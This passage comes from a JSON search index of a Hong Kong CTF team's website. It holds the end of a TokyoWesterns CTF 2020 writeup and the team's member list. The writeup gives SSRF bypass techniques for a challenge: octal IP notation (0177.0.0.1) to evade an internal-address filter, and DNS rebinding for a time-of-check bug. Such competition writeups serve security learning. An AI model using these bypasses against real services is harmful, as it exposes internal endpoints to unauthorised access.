http://127.0.0.1/admin-status The input needs to fulfil the pattern '\\A(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)\\Z' and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, int(\u0026quot;0177\u0026quot;) is still 177 instead of 127 in Python, so we can use http://0177.0.0.1/admin-status\nurlcheck v2 (Web, 128 points) Solved by Ozetta.\nObjective: SSRF http://localhost/admin-status Standard TOCTOU bug, just use DNS rebinding to get access: http://23bbd91c.","title":"TokyoWesterns CTF 6th 2020 Writeup"},{"content":"Black Bauhinia is a Capture-the-Flag team from Hong Kong founded in mid-2019 and have been actively participating in CTF games since then. You can find us on CTFtime, Twitter or Facebook. As you can see, this page is still work-in-progress.\nOur members   Mystiz (Joined Jul 2019) I guess therefore I am. Will guess hard for flags.\n     harrier (Joined Jul 2019)       cire meat pop (Joined Jul 2019)    byronwai (Joined Jul 2019) - A bard who put all his AP to ATK      wwkenwong (Joined Jul 2019) - North Korea\u0026#39;s botnet      ozetta (Joined Jul 2019)      kc (Joined Jul 2019)    Cousin (Joined Dec 2019) - Hellman Certified Cryptography Professional A math guy who loves cryptography, but cryptography doesn\u0026#39;t love back\n     double (Joined Dec 2019)    crabmony (Joined Mar 2020)      GeoffreyY (Joined Jul 2020)    eriri (Joined Jul 2020)      apple (Joined Jul 2020)    vikychoi (Joined Jul 2020)      M0UZ3 (Joined Sep 2020)    blackphreak (Joined Oct 2020) - An unlicensed front gate security I have a dream that someday I can become a security researcher.\n     Kaiziron (Joined Oct 2020)    Stdor (Joined Dec 2020)      TC0129 (Joined Feb 2021) - Member of Kiryukai This guy is too lazy to write. Peko.\n   egg (Joined Feb 2021)     ","permalink":"https://b6a.black/about-us/","summary":"Black Bauhinia is a Capture-the-Flag team from Hong Kong founded in mid-2019 and have been actively participating in CTF games since then. You can find us on CTFtime, Twitter or Facebook. As you can see, this page is still work-in-progress.\nOur members   Mystiz (Joined Jul 2019) I guess therefore I am. Will guess hard for flags.\n     harrier (Joined Jul 2019)       cire meat pop (Joined Jul 2019)    byronwai (Joined Jul 2019) - A bard who put all his AP to ATK      wwkenwong (Joined Jul 2019) - North Korea\u0026#39;s botnet      ozetta (Joined Jul 2019)      kc (Joined Jul 2019)    Cousin (Joined Dec 2019) - Hellman Certified Cryptography Professional A math guy who loves cryptography, but cryptography doesn\u0026#39;t love back","title":"About Us"}]